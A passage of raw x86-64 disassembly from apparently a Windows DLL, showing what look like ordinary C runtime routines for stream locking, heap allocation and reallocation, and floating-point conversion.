   18000c78f:	b8 00 02 00 00       	mov    $0x200,%eax
   18000c794:	eb 05                	jmp    0x18000c79b
   18000c796:	3b c7                	cmp    %edi,%eax
   18000c798:	0f 4c c7             	cmovl  %edi,%eax
   18000c79b:	48 63 c8             	movslq %eax,%rcx
   18000c79e:	ba 08 00 00 00       	mov    $0x8,%edx
   18000c7a3:	89 05 b7 f2 00 00    	mov    %eax,0xf2b7(%rip)        # 0x18001ba60
   18000c7a9:	e8 96 d9 ff ff       	call   0x18000a144
   18000c7ae:	48 89 05 a3 f2 00 00 	mov    %rax,0xf2a3(%rip)        # 0x18001ba58
   18000c7b5:	48 85 c0             	test   %rax,%rax
   18000c7b8:	75 24                	jne    0x18000c7de
   18000c7ba:	8d 50 08             	lea    0x8(%rax),%edx
   18000c7bd:	48 8b cf             	mov    %rdi,%rcx
   18000c7c0:	89 3d 9a f2 00 00    	mov    %edi,0xf29a(%rip)        # 0x18001ba60
   18000c7c6:	e8 79 d9 ff ff       	call   0x18000a144
   18000c7cb:	48 89 05 86 f2 00 00 	mov    %rax,0xf286(%rip)        # 0x18001ba58
   18000c7d2:	48 85 c0             	test   %rax,%rax
   18000c7d5:	75 07                	jne    0x18000c7de
   18000c7d7:	b8 1a 00 00 00       	mov    $0x1a,%eax
   18000c7dc:	eb 23                	jmp    0x18000c801
   18000c7de:	48 8d 0d eb d8 00 00 	lea    0xd8eb(%rip),%rcx        # 0x18001a0d0
   18000c7e5:	48 89 0c 03          	mov    %rcx,(%rbx,%rax,1)
   18000c7e9:	48 83 c1 30          	add    $0x30,%rcx
   18000c7ed:	48 8d 5b 08          	lea    0x8(%rbx),%rbx
   18000c7f1:	48 ff cf             	dec    %rdi
   18000c7f4:	74 09                	je     0x18000c7ff
   18000c7f6:	48 8b 05 5b f2 00 00 	mov    0xf25b(%rip),%rax        # 0x18001ba58
   18000c7fd:	eb e6                	jmp    0x18000c7e5
   18000c7ff:	33 c0                	xor    %eax,%eax
   18000c801:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000c806:	48 83 c4 20          	add    $0x20,%rsp
   18000c80a:	5f                   	pop    %rdi
   18000c80b:	c3                   	ret
   18000c80c:	48 83 ec 28          	sub    $0x28,%rsp
   18000c810:	e8 c3 23 00 00       	call   0x18000ebd8
   18000c815:	80 3d d0 e5 00 00 00 	cmpb   $0x0,0xe5d0(%rip)        # 0x18001adec
   18000c81c:	74 05                	je     0x18000c823
   18000c81e:	e8 a9 24 00 00       	call   0x18000eccc
   18000c823:	48 8b 0d 2e f2 00 00 	mov    0xf22e(%rip),%rcx        # 0x18001ba58
   18000c82a:	e8 51 8d ff ff       	call   0x180005580
   18000c82f:	48 83 25 21 f2 00 00 	andq   $0x0,0xf221(%rip)        # 0x18001ba58
   18000c836:	00 
   18000c837:	48 83 c4 28          	add    $0x28,%rsp
   18000c83b:	c3                   	ret
   18000c83c:	40 53                	rex push %rbx
   18000c83e:	48 83 ec 20          	sub    $0x20,%rsp
   18000c842:	48 8b d9             	mov    %rcx,%rbx
   18000c845:	48 8d 0d 84 d8 00 00 	lea    0xd884(%rip),%rcx        # 0x18001a0d0
   18000c84c:	48 3b d9             	cmp    %rcx,%rbx
   18000c84f:	72 40                	jb     0x18000c891
   18000c851:	48 8d 05 08 dc 00 00 	lea    0xdc08(%rip),%rax        # 0x18001a460
   18000c858:	48 3b d8             	cmp    %rax,%rbx
   18000c85b:	77 34                	ja     0x18000c891
   18000c85d:	48 8b d3             	mov    %rbx,%rdx
   18000c860:	48 b8 ab aa aa aa aa 	movabs $0x2aaaaaaaaaaaaaab,%rax
   18000c867:	aa aa 2a 
   18000c86a:	48 2b d1             	sub    %rcx,%rdx
   18000c86d:	48 f7 ea             	imul   %rdx
   18000c870:	48 c1 fa 03          	sar    $0x3,%rdx
   18000c874:	48 8b ca             	mov    %rdx,%rcx
   18000c877:	48 c1 e9 3f          	shr    $0x3f,%rcx
   18000c87b:	48 03 ca             	add    %rdx,%rcx
   18000c87e:	83 c1 10             	add    $0x10,%ecx
   18000c881:	e8 86 e4 ff ff       	call   0x18000ad0c
   18000c886:	0f ba 6b 18 0f       	btsl   $0xf,0x18(%rbx)
   18000c88b:	48 83 c4 20          	add    $0x20,%rsp
   18000c88f:	5b                   	pop    %rbx
   18000c890:	c3                   	ret
   18000c891:	48 8d 4b 30          	lea    0x30(%rbx),%rcx
   18000c895:	48 83 c4 20          	add    $0x20,%rsp
   18000c899:	5b                   	pop    %rbx
   18000c89a:	48 ff 25 3f 49 00 00 	rex.W jmp *0x493f(%rip)        # 0x1800111e0
   18000c8a1:	cc                   	int3
   18000c8a2:	cc                   	int3
   18000c8a3:	cc                   	int3
   18000c8a4:	40 53                	rex push %rbx
   18000c8a6:	48 83 ec 20          	sub    $0x20,%rsp
   18000c8aa:	48 8b da             	mov    %rdx,%rbx
   18000c8ad:	83 f9 14             	cmp    $0x14,%ecx
   18000c8b0:	7d 13                	jge    0x18000c8c5
   18000c8b2:	83 c1 10             	add    $0x10,%ecx
   18000c8b5:	e8 52 e4 ff ff       	call   0x18000ad0c
   18000c8ba:	0f ba 6b 18 0f       	btsl   $0xf,0x18(%rbx)
   18000c8bf:	48 83 c4 20          	add    $0x20,%rsp
   18000c8c3:	5b                   	pop    %rbx
   18000c8c4:	c3                   	ret
   18000c8c5:	48 8d 4a 30          	lea    0x30(%rdx),%rcx
   18000c8c9:	48 83 c4 20          	add    $0x20,%rsp
   18000c8cd:	5b                   	pop    %rbx
   18000c8ce:	48 ff 25 0b 49 00 00 	rex.W jmp *0x490b(%rip)        # 0x1800111e0
   18000c8d5:	cc                   	int3
   18000c8d6:	cc                   	int3
   18000c8d7:	cc                   	int3
   18000c8d8:	48 8d 15 f1 d7 00 00 	lea    0xd7f1(%rip),%rdx        # 0x18001a0d0
   18000c8df:	48 3b ca             	cmp    %rdx,%rcx
   18000c8e2:	72 37                	jb     0x18000c91b
   18000c8e4:	48 8d 05 75 db 00 00 	lea    0xdb75(%rip),%rax        # 0x18001a460
   18000c8eb:	48 3b c8             	cmp    %rax,%rcx
   18000c8ee:	77 2b                	ja     0x18000c91b
   18000c8f0:	0f ba 71 18 0f       	btrl   $0xf,0x18(%rcx)
   18000c8f5:	48 2b ca             	sub    %rdx,%rcx
   18000c8f8:	48 b8 ab aa aa aa aa 	movabs $0x2aaaaaaaaaaaaaab,%rax
   18000c8ff:	aa aa 2a 
   18000c902:	48 f7 e9             	imul   %rcx
   18000c905:	48 c1 fa 03          	sar    $0x3,%rdx
   18000c909:	48 8b ca             	mov    %rdx,%rcx
   18000c90c:	48 c1 e9 3f          	shr    $0x3f,%rcx
   18000c910:	48 03 ca             	add    %rdx,%rcx
   18000c913:	83 c1 10             	add    $0x10,%ecx
   18000c916:	e9 e1 e5 ff ff       	jmp    0x18000aefc
   18000c91b:	48 83 c1 30          	add    $0x30,%rcx
   18000c91f:	48 ff 25 c2 48 00 00 	rex.W jmp *0x48c2(%rip)        # 0x1800111e8
   18000c926:	cc                   	int3
   18000c927:	cc                   	int3
   18000c928:	83 f9 14             	cmp    $0x14,%ecx
   18000c92b:	7d 0d                	jge    0x18000c93a
   18000c92d:	0f ba 72 18 0f       	btrl   $0xf,0x18(%rdx)
   18000c932:	83 c1 10             	add    $0x10,%ecx
   18000c935:	e9 c2 e5 ff ff       	jmp    0x18000aefc
   18000c93a:	48 8d 4a 30          	lea    0x30(%rdx),%rcx
   18000c93e:	48 ff 25 a3 48 00 00 	rex.W jmp *0x48a3(%rip)        # 0x1800111e8
   18000c945:	cc                   	int3
   18000c946:	cc                   	int3
   18000c947:	cc                   	int3
   18000c948:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000c94d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000c952:	57                   	push   %rdi
   18000c953:	48 83 ec 40          	sub    $0x40,%rsp
   18000c957:	8b da                	mov    %edx,%ebx
   18000c959:	48 8b d1             	mov    %rcx,%rdx
   18000c95c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000c961:	41 8b f9             	mov    %r9d,%edi
   18000c964:	41 8b f0             	mov    %r8d,%esi
   18000c967:	e8 88 95 ff ff       	call   0x180005ef4
   18000c96c:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   18000c971:	0f b6 d3             	movzbl %bl,%edx
   18000c974:	40 84 7c 02 19       	test   %dil,0x19(%rdx,%rax,1)
   18000c979:	75 1e                	jne    0x18000c999
   18000c97b:	85 f6                	test   %esi,%esi
   18000c97d:	74 14                	je     0x18000c993
   18000c97f:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   18000c984:	48 8b 88 08 01 00 00 	mov    0x108(%rax),%rcx
   18000c98b:	0f b7 04 51          	movzwl (%rcx,%rdx,2),%eax
   18000c98f:	23 c6                	and    %esi,%eax
   18000c991:	eb 02                	jmp    0x18000c995
   18000c993:	33 c0                	xor    %eax,%eax
   18000c995:	85 c0                	test   %eax,%eax
   18000c997:	74 05                	je     0x18000c99e
   18000c999:	b8 01 00 00 00       	mov    $0x1,%eax
   18000c99e:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   18000c9a3:	74 0c                	je     0x18000c9b1
   18000c9a5:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   18000c9aa:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   18000c9b1:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   18000c9b6:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   18000c9bb:	48 83 c4 40          	add    $0x40,%rsp
   18000c9bf:	5f                   	pop    %rdi
   18000c9c0:	c3                   	ret
   18000c9c1:	cc                   	int3
   18000c9c2:	cc                   	int3
   18000c9c3:	cc                   	int3
   18000c9c4:	8b d1                	mov    %ecx,%edx
   18000c9c6:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   18000c9cc:	45 33 c0             	xor    %r8d,%r8d
   18000c9cf:	33 c9                	xor    %ecx,%ecx
   18000c9d1:	e9 72 ff ff ff       	jmp    0x18000c948
   18000c9d6:	cc                   	int3
   18000c9d7:	cc                   	int3
   18000c9d8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000c9dd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000c9e2:	57                   	push   %rdi
   18000c9e3:	48 83 ec 20          	sub    $0x20,%rsp
   18000c9e7:	48 8b da             	mov    %rdx,%rbx
   18000c9ea:	48 8b f9             	mov    %rcx,%rdi
   18000c9ed:	48 85 c9             	test   %rcx,%rcx
   18000c9f0:	75 0a                	jne    0x18000c9fc
   18000c9f2:	48 8b ca             	mov    %rdx,%rcx
   18000c9f5:	e8 c6 8b ff ff       	call   0x1800055c0
   18000c9fa:	eb 6a                	jmp    0x18000ca66
   18000c9fc:	48 85 d2             	test   %rdx,%rdx
   18000c9ff:	75 07                	jne    0x18000ca08
   18000ca01:	e8 7a 8b ff ff       	call   0x180005580
   18000ca06:	eb 5c                	jmp    0x18000ca64
   18000ca08:	48 83 fa e0          	cmp    $0xffffffffffffffe0,%rdx
   18000ca0c:	77 43                	ja     0x18000ca51
   18000ca0e:	48 8b 0d 8b e3 00 00 	mov    0xe38b(%rip),%rcx        # 0x18001ada0
   18000ca15:	b8 01 00 00 00       	mov    $0x1,%eax
   18000ca1a:	48 85 db             	test   %rbx,%rbx
   18000ca1d:	48 0f 44 d8          	cmove  %rax,%rbx
   18000ca21:	4c 8b c7             	mov    %rdi,%r8
   18000ca24:	33 d2                	xor    %edx,%edx
   18000ca26:	4c 8b cb             	mov    %rbx,%r9
   18000ca29:	ff 15 e1 47 00 00    	call   *0x47e1(%rip)        # 0x180011210
   18000ca2f:	48 8b f0             	mov    %rax,%rsi
   18000ca32:	48 85 c0             	test   %rax,%rax
   18000ca35:	75 6f                	jne    0x18000caa6
   18000ca37:	39 05 0b ea 00 00    	cmp    %eax,0xea0b(%rip)        # 0x18001b448
   18000ca3d:	74 50                	je     0x18000ca8f
   18000ca3f:	48 8b cb             	mov    %rbx,%rcx
   18000ca42:	e8 85 ac ff ff       	call   0x1800076cc
   18000ca47:	85 c0                	test   %eax,%eax
   18000ca49:	74 2b                	je     0x18000ca76
   18000ca4b:	48 83 fb e0          	cmp    $0xffffffffffffffe0,%rbx
   18000ca4f:	76 bd                	jbe    0x18000ca0e
   18000ca51:	48 8b cb             	mov    %rbx,%rcx
   18000ca54:	e8 73 ac ff ff       	call   0x1800076cc
   18000ca59:	e8 d2 ab ff ff       	call   0x180007630
   18000ca5e:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   18000ca64:	33 c0                	xor    %eax,%eax
   18000ca66:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000ca6b:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000ca70:	48 83 c4 20          	add    $0x20,%rsp
   18000ca74:	5f                   	pop    %rdi
   18000ca75:	c3                   	ret
   18000ca76:	e8 b5 ab ff ff       	call   0x180007630
   18000ca7b:	48 8b d8             	mov    %rax,%rbx
   18000ca7e:	ff 15 f4 45 00 00    	call   *0x45f4(%rip)        # 0x180011078
   18000ca84:	8b c8                	mov    %eax,%ecx
   18000ca86:	e8 c5 ab ff ff       	call   0x180007650
   18000ca8b:	89 03                	mov    %eax,(%rbx)
   18000ca8d:	eb d5                	jmp    0x18000ca64
   18000ca8f:	e8 9c ab ff ff       	call   0x180007630
   18000ca94:	48 8b d8             	mov    %rax,%rbx
   18000ca97:	ff 15 db 45 00 00    	call   *0x45db(%rip)        # 0x180011078
   18000ca9d:	8b c8                	mov    %eax,%ecx
   18000ca9f:	e8 ac ab ff ff       	call   0x180007650
   18000caa4:	89 03                	mov    %eax,(%rbx)
   18000caa6:	48 8b c6             	mov    %rsi,%rax
   18000caa9:	eb bb                	jmp    0x18000ca66
   18000caab:	cc                   	int3
   18000caac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000cab1:	57                   	push   %rdi
   18000cab2:	48 83 ec 20          	sub    $0x20,%rsp
   18000cab6:	49 8b f8             	mov    %r8,%rdi
   18000cab9:	48 8b da             	mov    %rdx,%rbx
   18000cabc:	48 85 c9             	test   %rcx,%rcx
   18000cabf:	74 1d                	je     0x18000cade
   18000cac1:	33 d2                	xor    %edx,%edx
   18000cac3:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   18000cac7:	48 f7 f1             	div    %rcx
   18000caca:	48 3b c3             	cmp    %rbx,%rax
   18000cacd:	73 0f                	jae    0x18000cade
   18000cacf:	e8 5c ab ff ff       	call   0x180007630
   18000cad4:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   18000cada:	33 c0                	xor    %eax,%eax
   18000cadc:	eb 5d                	jmp    0x18000cb3b
   18000cade:	48 0f af d9          	imul   %rcx,%rbx
   18000cae2:	b8 01 00 00 00       	mov    $0x1,%eax
   18000cae7:	48 85 db             	test   %rbx,%rbx
   18000caea:	48 0f 44 d8          	cmove  %rax,%rbx
   18000caee:	33 c0                	xor    %eax,%eax
   18000caf0:	48 83 fb e0          	cmp    $0xffffffffffffffe0,%rbx
   18000caf4:	77 18                	ja     0x18000cb0e
   18000caf6:	48 8b 0d a3 e2 00 00 	mov    0xe2a3(%rip),%rcx        # 0x18001ada0
   18000cafd:	8d 50 08             	lea    0x8(%rax),%edx
   18000cb00:	4c 8b c3             	mov    %rbx,%r8
   18000cb03:	ff 15 7f 45 00 00    	call   *0x457f(%rip)        # 0x180011088
   18000cb09:	48 85 c0             	test   %rax,%rax
   18000cb0c:	75 2d                	jne    0x18000cb3b
   18000cb0e:	83 3d 33 e9 00 00 00 	cmpl   $0x0,0xe933(%rip)        # 0x18001b448
   18000cb15:	74 19                	je     0x18000cb30
   18000cb17:	48 8b cb             	mov    %rbx,%rcx
   18000cb1a:	e8 ad ab ff ff       	call   0x1800076cc
   18000cb1f:	85 c0                	test   %eax,%eax
   18000cb21:	75 cb                	jne    0x18000caee
   18000cb23:	48 85 ff             	test   %rdi,%rdi
   18000cb26:	74 b2                	je     0x18000cada
   18000cb28:	c7 07 0c 00 00 00    	movl   $0xc,(%rdi)
   18000cb2e:	eb aa                	jmp    0x18000cada
   18000cb30:	48 85 ff             	test   %rdi,%rdi
   18000cb33:	74 06                	je     0x18000cb3b
   18000cb35:	c7 07 0c 00 00 00    	movl   $0xc,(%rdi)
   18000cb3b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000cb40:	48 83 c4 20          	add    $0x20,%rsp
   18000cb44:	5f                   	pop    %rdi
   18000cb45:	c3                   	ret
   18000cb46:	cc                   	int3
   18000cb47:	cc                   	int3
   18000cb48:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000cb4d:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000cb52:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   18000cb57:	55                   	push   %rbp
   18000cb58:	41 54                	push   %r12
   18000cb5a:	41 55                	push   %r13
   18000cb5c:	41 56                	push   %r14
   18000cb5e:	41 57                	push   %r15
   18000cb60:	48 8b ec             	mov    %rsp,%rbp
   18000cb63:	48 83 ec 60          	sub    $0x60,%rsp
   18000cb67:	48 8b 05 92 c4 00 00 	mov    0xc492(%rip),%rax        # 0x180019000
   18000cb6e:	48 33 c4             	xor    %rsp,%rax
   18000cb71:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   18000cb75:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   18000cb79:	44 0f b7 09          	movzwl (%rcx),%r9d
   18000cb7d:	33 db                	xor    %ebx,%ebx
   18000cb7f:	8b f8                	mov    %eax,%edi
   18000cb81:	25 00 80 00 00       	and    $0x8000,%eax
   18000cb86:	41 c1 e1 10          	shl    $0x10,%r9d
   18000cb8a:	89 45 c4             	mov    %eax,-0x3c(%rbp)
   18000cb8d:	8b 41 06             	mov    0x6(%rcx),%eax
   18000cb90:	81 e7 ff 7f 00 00    	and    $0x7fff,%edi
   18000cb96:	89 45 e8             	mov    %eax,-0x18(%rbp)
   18000cb99:	8b 41 02             	mov    0x2(%rcx),%eax
   18000cb9c:	81 ef ff 3f 00 00    	sub    $0x3fff,%edi
   18000cba2:	41 bc 1f 00 00 00    	mov    $0x1f,%r12d
   18000cba8:	48 89 55 d0          	mov    %rdx,-0x30(%rbp)
   18000cbac:	44 89 4d d8          	mov    %r9d,-0x28(%rbp)
   18000cbb0:	89 45 ec             	mov    %eax,-0x14(%rbp)
   18000cbb3:	44 89 4d f0          	mov    %r9d,-0x10(%rbp)
   18000cbb7:	8d 73 01             	lea    0x1(%rbx),%esi
   18000cbba:	45 8d 74 24 e4       	lea    -0x1c(%r12),%r14d
   18000cbbf:	81 ff 01 c0 ff ff    	cmp    $0xffffc001,%edi
   18000cbc5:	75 29                	jne    0x18000cbf0
   18000cbc7:	44 8b c3             	mov    %ebx,%r8d
   18000cbca:	8b c3                	mov    %ebx,%eax
   18000cbcc:	39 5c 85 e8          	cmp    %ebx,-0x18(%rbp,%rax,4)
   18000cbd0:	75 0d                	jne    0x18000cbdf
   18000cbd2:	48 03 c6             	add    %rsi,%rax
   18000cbd5:	49 3b c6             	cmp    %r14,%rax
   18000cbd8:	7c f2                	jl     0x18000cbcc
   18000cbda:	e9 b7 04 00 00       	jmp    0x18000d096
   18000cbdf:	48 89 5d e8          	mov    %rbx,-0x18(%rbp)
   18000cbe3:	89 5d f0             	mov    %ebx,-0x10(%rbp)
   18000cbe6:	bb 02 00 00 00       	mov    $0x2,%ebx
   18000cbeb:	e9 a6 04 00 00       	jmp    0x18000d096
   18000cbf0:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   18000cbf4:	45 8b c4             	mov    %r12d,%r8d
   18000cbf7:	41 83 cf ff          	or     $0xffffffff,%r15d
   18000cbfb:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   18000cbff:	8b 05 93 d8 00 00    	mov    0xd893(%rip),%eax        # 0x18001a498
   18000cc05:	89 7d c0             	mov    %edi,-0x40(%rbp)
   18000cc08:	ff c8                	dec    %eax
   18000cc0a:	44 8b eb             	mov    %ebx,%r13d
   18000cc0d:	89 45 c8             	mov    %eax,-0x38(%rbp)
   18000cc10:	ff c0                	inc    %eax
   18000cc12:	99                   	cltd
   18000cc13:	41 23 d4             	and    %r12d,%edx
   18000cc16:	03 c2                	add    %edx,%eax
   18000cc18:	44 8b d0             	mov    %eax,%r10d
   18000cc1b:	41 23 c4             	and    %r12d,%eax
   18000cc1e:	41 c1 fa 05          	sar    $0x5,%r10d
   18000cc22:	2b c2                	sub    %edx,%eax
   18000cc24:	44 2b c0             	sub    %eax,%r8d
   18000cc27:	4d 63 da             	movslq %r10d,%r11
   18000cc2a:	42 8b 4c 9d e8       	mov    -0x18(%rbp,%r11,4),%ecx
   18000cc2f:	44 89 45 dc          	mov    %r8d,-0x24(%rbp)
   18000cc33:	44 0f a3 c1          	bt     %r8d,%ecx
   18000cc37:	0f 83 9e 00 00 00    	jae    0x18000ccdb
   18000cc3d:	41 8b c8             	mov    %r8d,%ecx
   18000cc40:	41 8b c7             	mov    %r15d,%eax
   18000cc43:	49 63 d2             	movslq %r10d,%rdx
   18000cc46:	d3 e0                	shl    %cl,%eax
   18000cc48:	f7 d0                	not    %eax
   18000cc4a:	85 44 95 e8          	test   %eax,-0x18(%rbp,%rdx,4)
   18000cc4e:	75 19                	jne    0x18000cc69
   18000cc50:	41 8d 42 01          	lea    0x1(%r10),%eax
   18000cc54:	48 63 c8             	movslq %eax,%rcx
   18000cc57:	eb 09                	jmp    0x18000cc62
   18000cc59:	39 5c 8d e8          	cmp    %ebx,-0x18(%rbp,%rcx,4)
   18000cc5d:	75 0a                	jne    0x18000cc69
   18000cc5f:	48 03 ce             	add    %rsi,%rcx
   18000cc62:	49 3b ce             	cmp    %r14,%rcx
   18000cc65:	7c f2                	jl     0x18000cc59
   18000cc67:	eb 72                	jmp    0x18000ccdb
   18000cc69:	8b 45 c8             	mov    -0x38(%rbp),%eax
   18000cc6c:	41 8b cc             	mov    %r12d,%ecx
   18000cc6f:	99                   	cltd
   18000cc70:	41 23 d4             	and    %r12d,%edx
   18000cc73:	03 c2                	add    %edx,%eax
   18000cc75:	44 8b c0             	mov    %eax,%r8d
   18000cc78:	41 23 c4             	and    %r12d,%eax
   18000cc7b:	2b c2                	sub    %edx,%eax
   18000cc7d:	41 c1 f8 05          	sar    $0x5,%r8d
   18000cc81:	8b d6                	mov    %esi,%edx
   18000cc83:	2b c8                	sub    %eax,%ecx
   18000cc85:	4d 63 d8             	movslq %r8d,%r11
   18000cc88:	42 8b 44 9d e8       	mov    -0x18(%rbp,%r11,4),%eax
   18000cc8d:	d3 e2                	shl    %cl,%edx
   18000cc8f:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
   18000cc92:	3b c8                	cmp    %eax,%ecx
   18000cc94:	72 04                	jb     0x18000cc9a
   18000cc96:	3b ca                	cmp    %edx,%ecx
   18000cc98:	73 03                	jae    0x18000cc9d
   18000cc9a:	44 8b ee             	mov    %esi,%r13d
   18000cc9d:	41 8d 40 ff          	lea    -0x1(%r8),%eax
   18000cca1:	42 89 4c 9d e8       	mov    %ecx,-0x18(%rbp,%r11,4)
   18000cca6:	48 63 d0             	movslq %eax,%rdx
   18000cca9:	85 c0                	test   %eax,%eax
   18000ccab:	78 27                	js     0x18000ccd4
   18000ccad:	45 85 ed             	test   %r13d,%r13d
   18000ccb0:	74 22                	je     0x18000ccd4
   18000ccb2:	8b 44 95 e8          	mov    -0x18(%rbp,%rdx,4),%eax
   18000ccb6:	44 8b eb             	mov    %ebx,%r13d
   18000ccb9:	44 8d 40 01          	lea    0x1(%rax),%r8d
   18000ccbd:	44 3b c0             	cmp    %eax,%r8d
   18000ccc0:	72 05                	jb     0x18000ccc7
   18000ccc2:	44 3b c6             	cmp    %esi,%r8d
   18000ccc5:	73 03                	jae    0x18000ccca
   18000ccc7:	44 8b ee             	mov    %esi,%r13d
   18000ccca:	44 89 44 95 e8       	mov    %r8d,-0x18(%rbp,%rdx,4)
   18000cccf:	48 2b d6             	sub    %rsi,%rdx
   18000ccd2:	79 d9                	jns    0x18000ccad
   18000ccd4:	44 8b 45 dc          	mov    -0x24(%rbp),%r8d
   18000ccd8:	4d 63 da             	movslq %r10d,%r11
   18000ccdb:	41 8b c8             	mov    %r8d,%ecx
   18000ccde:	41 8b c7             	mov    %r15d,%eax
   18000cce1:	d3 e0                	shl    %cl,%eax
   18000cce3:	42 21 44 9d e8       	and    %eax,-0x18(%rbp,%r11,4)
   18000cce8:	41 8d 42 01          	lea    0x1(%r10),%eax
   18000ccec:	48 63 d0             	movslq %eax,%rdx
   18000ccef:	49 3b d6             	cmp    %r14,%rdx
   18000ccf2:	7d 1d                	jge    0x18000cd11
   18000ccf4:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   18000ccf8:	4d 8b c6             	mov    %r14,%r8
   18000ccfb:	4c 2b c2             	sub    %rdx,%r8
   18000ccfe:	48 8d 0c 91          	lea    (%rcx,%rdx,4),%rcx
   18000cd02:	33 d2                	xor    %edx,%edx
   18000cd04:	49 c1 e0 02          	shl    $0x2,%r8
   18000cd08:	e8 53 85 ff ff       	call   0x180005260
   18000cd0d:	44 8b 4d d8          	mov    -0x28(%rbp),%r9d
   18000cd11:	45 85 ed             	test   %r13d,%r13d
   18000cd14:	74 02                	je     0x18000cd18
   18000cd16:	03 fe                	add    %esi,%edi
   18000cd18:	8b 0d 76 d7 00 00    	mov    0xd776(%rip),%ecx        # 0x18001a494
   18000cd1e:	8b c1                	mov    %ecx,%eax
   18000cd20:	2b 05 72 d7 00 00    	sub    0xd772(%rip),%eax        # 0x18001a498
   18000cd26:	3b f8                	cmp    %eax,%edi
   18000cd28:	7d 14                	jge    0x18000cd3e
   18000cd2a:	48 89 5d e8          	mov    %rbx,-0x18(%rbp)
   18000cd2e:	89 5d f0             	mov    %ebx,-0x10(%rbp)
   18000cd31:	44 8b c3             	mov    %ebx,%r8d
   18000cd34:	bb 02 00 00 00       	mov    $0x2,%ebx
   18000cd39:	e9 54 03 00 00       	jmp    0x18000d092
   18000cd3e:	3b f9                	cmp    %ecx,%edi
   18000cd40:	0f 8f 31 02 00 00    	jg     0x18000cf77
   18000cd46:	2b 4d c0             	sub    -0x40(%rbp),%ecx
   18000cd49:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   18000cd4d:	45 8b d7             	mov    %r15d,%r10d
   18000cd50:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   18000cd54:	8b c1                	mov    %ecx,%eax
   18000cd56:	44 89 4d f0          	mov    %r9d,-0x10(%rbp)
   18000cd5a:	99                   	cltd
   18000cd5b:	4d 8b de             	mov    %r14,%r11
   18000cd5e:	44 8b cb             	mov    %ebx,%r9d
   18000cd61:	41 23 d4             	and    %r12d,%edx
   18000cd64:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   18000cd68:	03 c2                	add    %edx,%eax
   18000cd6a:	44 8b e8             	mov    %eax,%r13d
   18000cd6d:	41 23 c4             	and    %r12d,%eax
   18000cd70:	2b c2                	sub    %edx,%eax
   18000cd72:	41 c1 fd 05          	sar    $0x5,%r13d
   18000cd76:	8b c8                	mov    %eax,%ecx
   18000cd78:	8b f8                	mov    %eax,%edi
   18000cd7a:	b8 20 00 00 00       	mov    $0x20,%eax
   18000cd7f:	41 d3 e2             	shl    %cl,%r10d
   18000cd82:	2b c1                	sub    %ecx,%eax
   18000cd84:	44 8b f0             	mov    %eax,%r14d
   18000cd87:	41 f7 d2             	not    %r10d
   18000cd8a:	41 8b 00             	mov    (%r8),%eax
   18000cd8d:	8b cf                	mov    %edi,%ecx
   18000cd8f:	8b d0                	mov    %eax,%edx
   18000cd91:	d3 e8                	shr    %cl,%eax
   18000cd93:	41 8b ce             	mov    %r14d,%ecx
   18000cd96:	41 0b c1             	or     %r9d,%eax
   18000cd99:	41 23 d2             	and    %r10d,%edx
   18000cd9c:	44 8b ca             	mov    %edx,%r9d
   18000cd9f:	41 89 00             	mov    %eax,(%r8)
   18000cda2:	4d 8d 40 04          	lea    0x4(%r8),%r8
   18000cda6:	41 d3 e1             	shl    %cl,%r9d
   18000cda9:	4c 2b de             	sub    %rsi,%r11
   18000cdac:	75 dc                	jne    0x18000cd8a
   18000cdae:	4d 63 d5             	movslq %r13d,%r10
   18000cdb1:	41 8d 7b 02          	lea    0x2(%r11),%edi
   18000cdb5:	45 8d 73 03          	lea    0x3(%r11),%r14d
   18000cdb9:	4d 8b ca             	mov    %r10,%r9
   18000cdbc:	44 8b c7             	mov    %edi,%r8d
   18000cdbf:	49 f7 d9             	neg    %r9
   18000cdc2:	4d 3b c2             	cmp    %r10,%r8
   18000cdc5:	7c 15                	jl     0x18000cddc
   18000cdc7:	49 8b d0             	mov    %r8,%rdx
   18000cdca:	48 c1 e2 02          	shl    $0x2,%rdx
   18000cdce:	4a 8d 04 8a          	lea    (%rdx,%r9,4),%rax
   18000cdd2:	8b 4c 05 e8          	mov    -0x18(%rbp,%rax,1),%ecx
   18000cdd6:	89 4c 15 e8          	mov    %ecx,-0x18(%rbp,%rdx,1)
   18000cdda:	eb 05                	jmp    0x18000cde1
   18000cddc:	42 89 5c 85 e8       	mov    %ebx,-0x18(%rbp,%r8,4)
   18000cde1:	4c 2b c6             	sub    %rsi,%r8
   18000cde4:	79 dc                	jns    0x18000cdc2
   18000cde6:	44 8b 45 c8          	mov    -0x38(%rbp),%r8d
   18000cdea:	45 8b dc             	mov    %r12d,%r11d
   18000cded:	41 8d 40 01          	lea    0x1(%r8),%eax
   18000cdf1:	99                   	cltd
   18000cdf2:	41 23 d4             	and    %r12d,%edx
